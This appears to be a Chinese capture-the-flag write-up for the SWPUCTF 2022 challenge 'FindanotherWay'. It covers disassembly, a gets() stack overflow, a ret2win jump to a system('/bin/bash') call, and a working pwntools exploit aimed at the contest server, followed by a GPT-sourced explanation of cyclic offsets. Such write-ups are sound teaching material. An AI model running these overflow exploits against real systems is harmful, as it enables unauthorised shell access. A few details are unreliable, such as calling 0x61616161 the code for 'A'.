## 基本信息

- 题目名称： [SWPUCTF 2022 新生赛]FindanotherWay
- 题目链接： https://www.nssctf.cn/problem/2783
- 考点清单： 逆向，汇编语言，栈溢出
- 工具清单： IDA Pro（非必须）
- payloads： ./payload/[SWPUCTF 2022 新生赛]FindanotherWay-Payload.py

## 一、看到什么

### 第一轮

1. nc连一下容器，输入测试数据无回显

![\[SWPUCTF 2022 新生赛]FindanotherWay-hello](images/[SWPUCTF 2022 新生赛]FindanotherWay-hello.png)

1. 二进制文件FindanotherWay，用gdb打开，看到以下函数

![\[SWPUCTF 2022 新生赛]FindanotherWay-func](images/[SWPUCTF 2022 新生赛]FindanotherWay-func.png)

## 二、想到什么解题思路

### 第一轮

1. 发现函数`youfindit`，`nss`，`vuln`，尝试从这三个函数入手
1. 尝试解读`main`函数

## 三、尝试过程和结果记录

### 第一轮

1. 反汇编`youfindit`函数，发现一个系统调用

![\[SWPUCTF 2022 新生赛]FindanotherWay-disas_youfindit](images/[SWPUCTF 2022 新生赛]FindanotherWay-disas_youfindit.png)

2. 打印几个常量看看是什么，发现直接开终端，确定该函数用于攻击代码执行

![\[SWPUCTF 2022 新生赛]FindanotherWay-strings](images/[SWPUCTF 2022 新生赛]FindanotherWay-strings.png)

3. 查看nss函数，发现是一堆puts，应该是之前看到的欢迎语

![\[SWPUCTF 2022 新生赛]FindanotherWay-disas_nss](images/[SWPUCTF 2022 新生赛]FindanotherWay-disas_nss.png)

3. 查看vuln函数，发现漏洞点gets函数，可以用于执行缓冲区溢出

![\[SWPUCTF 2022 新生赛]FindanotherWay-disas_vuln](images/[SWPUCTF 2022 新生赛]FindanotherWay-disas_vuln.png)

4. 查看主函数，寻找有关上述两个函数的调用，发现对漏洞函数的调用

![\[SWPUCTF 2022 新生赛]FindanotherWay-disas_main](images/[SWPUCTF 2022 新生赛]FindanotherWay-disas_main.png)

5. 已经确认攻击方式为栈溢出，打断点、定义hook用以查看状态，动态调试

![\[SWPUCTF 2022 新生赛]FindanotherWay-debug_1](images/[SWPUCTF 2022 新生赛]FindanotherWay-debug_1.png)

这里对于rsp栈帧后的监视稍微短了点，10wx长度更合理，补充查看

![\[SWPUCTF 2022 新生赛]FindanotherWay-debug_2](images/[SWPUCTF 2022 新生赛]FindanotherWay-debug_2.png)

发现函数返回点

![\[SWPUCTF 2022 新生赛]FindanotherWay-ret](images/[SWPUCTF 2022 新生赛]FindanotherWay-ret.png)

继续执行，输入测试数据AAAAAAAA，发现gets函数读取的数据从地址e018处开始存储

6. 计算padding：5x4=20个字符；跳转目标0x00401250，可以直接运行系统调用，拿到shell

![\[SWPUCTF 2022 新生赛]FindanotherWay-padding](images/[SWPUCTF 2022 新生赛]FindanotherWay-padding.png)

6. 构造payload

```python
from pwn import *
p = remote("node5.anna.nssctf.cn", 23479)
elf = ELF('./FindanotherWay')
padding = 20
rt_addr = 0x401250
payload = b'A'* padding + p64(rt_addr)
p.sendline(payload)
p.interactive()
```

7. 运行，成功获得shell

![\[SWPUCTF 2022 新生赛]FindanotherWay-shell](images/[SWPUCTF 2022 新生赛]FindanotherWay-shell.png)

8. 寻找flag，ls直接看到有flag

![\[SWPUCTF 2022 新生赛]FindanotherWay-flag](images/[SWPUCTF 2022 新生赛]FindanotherWay-flag.png)

## 四、总结与反思

- 解题收获：学习了简单栈溢出
- 不足之处：监视栈的时候没有把ret也监视到，稍微浪费了搜集信息时间
- 改进措施：更灵活的运用动调手段

### 关于python pwn库的一些其他用法（GPT解答）

在 CTF (Capture The Flag) 的 pwn 题目中，通常涉及到缓冲区溢出攻击。为了定位溢出位置和找到合适的返回地址，我们常常使用 `pattern_create` 和 `pattern_offset` 函数。这两个函数是 pwn 工具包（`pwntools`）中的工具，用于帮助我们生成特定的填充数据和定位溢出发生的位置。

#### `pattern_create` 和 `pattern_offset` 详解

##### 1. `pattern_create`

`pattern_create` 是一个用来生成特定模式的函数，目的是为填充缓冲区溢出攻击时使用。它生成的模式是一个易于区分的字符串，通常用于填充输入数据（比如发送给目标程序的 `payload`）。

这个函数会生成一个固定长度的、由唯一字符组成的字符串，形式通常是像 `Aa0Aa1Aa2...` 这样的字符序列。利用这种模式，我们可以在程序崩溃时通过查看栈中的内容，快速定位哪个位置覆盖了返回地址。

##### 示例：

```python
from pwn import *

# 创建一个长度为1000的模式
pattern = cyclic(1000)
print(pattern)
```

输出的内容是一个包含 1000 个字符的字符串。它的作用是填充缓冲区，用于后续的溢出攻击。

------

##### 2. `pattern_offset`

`pattern_offset` 用于帮助我们定位溢出发生的位置。它接收目标程序崩溃时栈的内容，并通过在栈中找到特定的模式来确定溢出的位置。

当你用 `pattern_create` 创建了一个独特的模式并将它发送给程序时，程序会崩溃（通常是因为覆盖了返回地址或其它重要栈数据）。然后，你可以通过获取崩溃时栈中的内容来分析溢出的位置。`pattern_offset` 函数可以帮助你根据崩溃的堆栈内容找出偏移量。

##### 如何使用 `pattern_offset`：

1.  先用 `pattern_create` 创建一个模式并发送给目标程序。
2.  程序崩溃时，会产生一个栈溢出的情况。此时，使用 GDB（或其它调试工具）来分析崩溃时的栈信息。
3.  找到栈上溢出的部分，记下那个位置。
4.  用 `pattern_offset` 函数来分析崩溃时返回的内容，找出溢出的位置。

##### 示例：

假设你已经通过调试得知，崩溃时栈上有一个类似于 `0x61616161` 的值，这通常是 `A`（即 `0x41`）的 ASCII 编码。那么你可以用以下代码来查找该值对应的偏移量。

```python
from pwn import *

# 假设栈上的值是 0x61616161
offset = cyclic_find(0x61616161)
print("Offset is:", offset)
```

这里，`cyclic_find` 是 `pwntools` 中的一个函数，它可以根据输入的值（如 `0x61616161`）返回该值在 `cyclic` 创建的模式中的位置，也就是偏移量。

------

#### 具体应用过程

在你给出的代码中，如何使用这两个函数的过程如下：

1.  **创建一个填充模式**：使用 `cyclic(1000)` 创建一个长度为 1000 的填充模式，发送给目标程序。

    ```python
    payload = cyclic(1000)
    p.sendline(payload)
    ```

2.  **分析崩溃时的栈**：你使用 GDB 等工具来分析崩溃时的栈信息。假设你在栈上发现了一个值 `0x61616161`，这对应着字符 `A` 的 ASCII 编码。

3.  **找到偏移量**：通过 `cyclic_find` 函数，查找该值在填充模式中的位置，也就是溢出发生的位置。例如：

    ```python
    offset = cyclic_find(0x61616161)
    print(f"偏移量是: {offset}")
    ```

4.  **构造正确的 payload**：根据计算出的偏移量，构造一个 payload 来覆盖返回地址，执行你的攻击。

    ```python
    padding = b'A' * offset
    payload = padding + p64(0x40101A) + p64(youfindit_addr)
    p.sendline(payload)
    ```

------

#### 小结

-   **`pattern_create`**：用于生成一个易于识别的填充模式（例如，包含唯一字符的字符串），用于填充缓冲区。
-   **`pattern_offset`** 或 **`cyclic_find`**：用于分析栈信息，帮助定位缓冲区溢出时返回地址的偏移量。

这种方法可以帮助你准确定位栈上的溢出位置，从而构造一个正确的 payload 执行你的攻击（如执行函数调用、获取 shell 等）。

### 关于gadget跳转地址的思考

上述过程在vuln函数ret处跳转到0x401250，会导致工作栈把0x401250处当做调用处的下一条语句，进而直接执行`youfindit`函数的下面这几条语句（跳转至401250是最靠后的地址，当然本题也可以跳转至`youfindit`函数的前面其他地方）

```assembly
0x0000000000401250 <+32>:    lea    rdi,[rip+0x113a]        # "/bin/bash"，rdi为调用函数的第一个参数传入system函数
0x0000000000401257 <+39>:    mov    eax,0x0
0x000000000040125c <+44>:    call   0x401090 <system@plt>
...
```

实际栈内的操作是这样的：

![\[SWPUCTF 2022 新生赛]FindanotherWay-graph](images/[SWPUCTF 2022 新生赛]FindanotherWay-graph.png)

给`gets`函数再加上一个ret也可以成功跳转，不过变相的将栈拉长了

![\[SWPUCTF 2022 新生赛]FindanotherWay-graph](images/[SWPUCTF 2022 新生赛]FindanotherWay-graph2.png)

## 五、本地工具环境配置

### python pwn库

```shell
pip install pwn
```

